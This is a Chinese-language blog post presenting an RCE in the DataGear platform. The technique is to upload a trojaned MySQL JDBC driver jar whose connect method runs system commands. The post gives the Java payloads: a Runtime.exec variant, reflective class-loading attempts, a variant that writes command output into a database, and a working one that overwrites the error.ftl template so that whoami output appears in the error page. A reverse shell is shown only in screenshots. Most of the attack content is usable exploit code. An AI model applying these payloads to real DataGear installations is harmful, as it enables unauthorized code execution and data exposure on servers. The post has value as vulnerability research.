# datagear 最新 rce 漏洞

## 前言

这个漏洞的思路可以说很顶级了，简直无敌，主要是通过传入 jar 替换数据库驱动，但是 jar 又是我们修改过的 jar，然后导致执行里面的一些方法，导致了 rce

## datagear

为什么会出现这个漏洞就不得不提到我们的 datagear 是干嘛的了

官方文档 [http://www.datagear.tech/documentation/#installation](http://www.datagear.tech/documentation/#installation)

DataGear 是一款开源免费的数据可视化分析平台，自由制作任何您想要的数据看板，支持接入 SQL、CSV、Excel、HTTP 接口、JSON 等多种数据源。 系统主要功能包括：数据源管理、SQL 工作台、数据导入/导出、项目管理、数据集管理、图表管理、看板管理、用户管理、角色管理、数据源驱动管理、图表插件管理等。

系统特点：

安全稳定 六年持续开发迭代，累计发布 50+版本，稳定运行数千小时无异常，功能流畅不卡顿 私有化部署，单体应用，轻量架构，安装简单，运行环境和数据全掌控 基于角色的权限控制策略，数据默认私有，可分享共用，保护数据安全 越权访问校验、SQL 防注入、数据源防护、敏感信息加密存储、日志脱敏处理 功能丰富 数据源管理支持数据增删改查、导入导出、SQL 工作台 数据集支持 SQL/HTTP/CSV/Excel/JSON/文件，支持定义参数和参数化语法 图表支持在一个内绑定多个不同来源的数据集，内置 70+开箱即用的常用图表 数据看板支持导入 HTML 模板、可视/源码编辑模式、分享密码、iframe 嵌入 用户管理、角色管理、数据源驱动管理、图表插件管理等功能 易于扩展 支持运行时添加数据源驱动，接入任何提供 JDBC 驱动库的数据库，包括但不限于 MySQL、PostgreSQL、Oracle、SQL Server、Elasticsearch、ClickHouse，以及 OceanBase、TiDB、人大金仓、达梦等众多国产数据库 支持编写和上传自定义图表插件，扩展系统图表类型，也支持重写和扩展内置图表插件、自定义图表选项，个性化图表展示效果 自由制作 数据看板采用原生的 HTML 网页作为模板，支持导入任意 HTML/JavaScript/CSS，支持可视化设计，同时支持自由编辑源码 支持引入 Vue、React、Bootstrap、Tailwind CSS 等 web 前端框架，制作具有丰富交互效果、多端适配的数据看板 内置丰富的数据看板 API，可制作图表联动、数据钻取、异步加载、交互表单等个性化数据看板

## 漏洞复现

首先搭建一个环境 只需要去下载官方的文件，然后在 idea 导入就 ok

登录 admin 后 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209011406.png)

原来有的数据库驱动

![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209011528.png) 我们还可以自己上传

![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209011548.png) 这里我们就上传自己构造的恶意 jar

我下了一个 mysql-connector-java-8.0.28.jar

修改其中的 com.mysql.cj.jdbc.NonRegisteringDriver 文件

修改它的 connect 方法

public Connection connect(String url, Properties info) throws SQLException {  
    try {  
        Runtime.getRuntime().exec("calc");  
    } catch (CJException | IOException var7) {  
        throw SQLExceptionsMapping.translateException(var7);  
    }  
    return null;  
}

然后我们上传 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209012316.png) 成功上传 然后我们导入一个数据库，然后利用这个驱动

![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209012357.png)

再次点击数据库 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209012424.png)

弹出计算器，因为连接过程中调用了 connect 方法

反弹一手 shell 试试 重新构造方法

![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209013055.png) 然后一样的步骤

起个端口监听 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209013129.png)

## 不出网利用

### 自定义 class 探索

然后探索了一波不出网该怎么利用，这里记录一下过程吧

首先第一就是打内存马，但是有个问题在于我不能使用非 jar 包的类

开始拷打 gpt

import java.io.\*;  
import java.lang.reflect.Method;  
​  
public class MyDatabaseConnection {  
    public String connect(String url, Properties info) throws SQLException {  
        StringBuilder output \= new StringBuilder();  
        try {  
            // 获取类字节码文件的路径  
            String classPath \= info.getProperty("classPath");  // 假设 classPath 是传递的类字节码文件的路径  
​  
            // 读取字节码文件  
            FileInputStream classFile \= new FileInputStream(classPath);  
            byte\[\] classBytes \= classFile.readAllBytes();  
            classFile.close();  
​  
            // 创建自定义 ClassLoader  
            MyClassLoader classLoader \= new MyClassLoader();  
            // 加载字节码到内存  
            Class<?> loadedClass \= classLoader.defineClass("MyClass", classBytes);  
​  
            // 创建加载的类的实例  
            Object instance \= loadedClass.getDeclaredConstructor().newInstance();  
​  
            // 假设目标类有一个名为 \`run\` 的方法  
            Method runMethod \= loadedClass.getMethod("run");  
            Object result \= runMethod.invoke(instance);  
​  
            // 获取方法的输出并返回  
            output.append(result.toString());  
        } catch (Exception e) {  
            throw new SQLException("Error loading class or executing method", e);  
        }  
​  
        return output.toString();  
    }  
      
    // 自定义 ClassLoader 用于加载类字节码  
    public class MyClassLoader extends ClassLoader {  
        public Class<?> defineClass(String className, byte\[\] classData) {  
            return defineClass(className, classData, 0, classData.length);  
        }  
    }  
}  
​

看起来好像没有问题，但是我们只能修改一个方法，也不能修改类啊，这个是需要自己定义的 MyClassLoader

然后尝试有没有不需要的

import java.sql.Connection;  
import java.sql.SQLException;  
import java.util.Base64;  
import java.lang.reflect.Method;  
​  
public Connection connect(String url, Properties info) throws SQLException {  
    try {  
        // 获取 Base64 编码的字节码字符串  
        String base64EncodedClass \= info.getProperty("base64Class");  // 假设通过 "base64Class" 属性传递 Base64 字符串  
​  
        // 解码 Base64 字符串为字节数组  
        byte\[\] classBytes \= Base64.getDecoder().decode(base64EncodedClass);  
​  
        // 使用 ClassLoader 加载字节码  
        ClassLoader classLoader \= this.getClass().getClassLoader();  
        Class<?> loadedClass \= (Class<?>) Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", String.class, byte\[\].class, int.class, int.class)  
            .setAccessible(true).invoke(classLoader, null, classBytes, 0, classBytes.length);  
​  
        // 创建类的实例  
        Object instance \= loadedClass.getDeclaredConstructor().newInstance();  
​  
        // 假设目标类有一个名为 "run" 的方法  
        Method runMethod \= loadedClass.getMethod("run");  
        Object result \= runMethod.invoke(instance);  
​  
        // 如果目标方法有返回值，可以处理它  
        System.out.println(result);  
​  
        return null; // 或返回一个连接对象  
    } catch (Exception e) {  
        throw new SQLException("Error loading class or executing method", e);  
    }  
}  
​

这个可以看到没有自定义类了，但是问题在于我放到里面会报错

那个 invoke 那里一直报错，没有找到解决办法，就尝试其他的办法了

最后也是无果

然后想到了一个歪门邪道的办法，就是如何才能在 jar 包定义一个类

我想的是直接修改一个类，但是类和类之间是有关联性的

于是找了一会发现一个类

![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014226.png) 这个类

//  
// Source code recreated from a .class file by IntelliJ IDEA  
// (powered by FernFlower decompiler)  
//  
​  
package com.mysql.jdbc;  
​  
import java.sql.SQLException;  
​  
public class Driver extends com.mysql.cj.jdbc.Driver {  
    public Driver() throws SQLException {  
    }  
​  
    static {  
        System.err.println("Loading class \`com.mysql.jdbc.Driver'. This is deprecated. The new driver class is \`com.mysql.cj.jdbc.Driver'. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.");  
    }  
}  
​

就是一个简单的提示，没有其他的任何作用

然后我就把它改成了我们需要自定义的类，但是类名我没有办法改

我先随便尝试一下能不能调用自定义类的方法 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014500.png) 改成了这个样子

然后可惜的是 我们的目标类![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014529.png)

我不能引入两个名字一样的文件

这样会报错

### 执行命令把结果写入数据库中

然后我又思考了一个逆天的办法

开始尝试一下

import java.sql.Connection;  
import java.sql.DriverManager;  
import java.sql.PreparedStatement;  
import java.sql.SQLException;  
import java.io.BufferedReader;  
import java.io.InputStreamReader;  
import java.util.Properties;  
​  
public class CustomConnection {  
​  
    public Connection connect(String url, Properties info) throws SQLException {  
        try {  
            // 执行外部命令（例如：cat flag）  
            Process process \= Runtime.getRuntime().exec("calc");  
​  
            // 获取命令输出流  
            BufferedReader reader \= new BufferedReader(new InputStreamReader(process.getInputStream()));  
            StringBuilder commandResult \= new StringBuilder();  
            String line;  
​  
            // 读取命令输出并拼接结果  
            while ((line \= reader.readLine()) != null) {  
                commandResult.append(line).append("\\n");  
            }  
​  
            // 确保命令执行完成  
            process.waitFor();  
​  
            // 获取数据库连接  
            Connection dbConnection \= DriverManager.getConnection(url, info);  
​  
            // SQL 插入语句  
            String sql \= "INSERT INTO exp (content) VALUES (?)";  
            PreparedStatement stmt \= dbConnection.prepareStatement(sql);  
​  
            // 插入命令的输出结果到 content 字段  
            stmt.setString(1, commandResult.toString());  
            stmt.executeUpdate();  
​  
            stmt.close();  
            dbConnection.close();  
​  
            return null; // 返回 null 按照原方法要求  
​  
        } catch (Exception var4) {  
            throw SQLExceptionsMapping.translateException(var4); // 使用提供的异常映射  
        }  
    }  
}  
​

然后一样的方法去尝试

发现结果是一直调用 connect 方法 导致我的电脑一直弹计算器

然后根本停不下来，大家不要随便尝试

然后我再去查看我的数据库的时候 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014915.png) 伤心了老弟 什么结果都没有 但是我还是不服气

### 覆盖模板文件外带

我想了半天，到底应该怎么办，必须有回显，那我能不能覆盖模板呢?

尝试一手

public Connection connect(String url, Properties info) throws SQLException {  
    try {  
        Process process \= Runtime.getRuntime().exec("whoami");  
        BufferedReader reader \= new BufferedReader(new InputStreamReader(process.getInputStream()));  
        StringBuilder commandResult \= new StringBuilder();  
​  
        String line;  
        while((line \= reader.readLine()) != null) {  
            commandResult.append(line).append("\\n");  
        }  
​  
        process.waitFor();  
        String filePath \= "F:\\\\IntelliJ IDEA 2023.3.2\\\\javascript\\\\cms\\\\datagear-4.5.0\\\\datagear-web\\\\src\\\\main\\\\resources\\\\org\\\\datagear\\\\web\\\\templates\\\\error.ftl";  
        Files.write(Paths.get(filePath), commandResult.toString().getBytes(), new OpenOption\[\]{StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE\_EXISTING});  
        System.out.println("Command output has been written to: " + filePath);  
    } catch (InterruptedException | IOException var8) {  
        var8.printStackTrace();  
    }  
​  
    return null;  
}

我把命令执行结果直接外带到模板文件

尝试一手

先随便取名字

![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209015227.png) 访问不存在页面报错

![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209015251.png) 然后尝试上传 jar ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209015323.png) 回显成功外带了 我是等了一会回显才有的
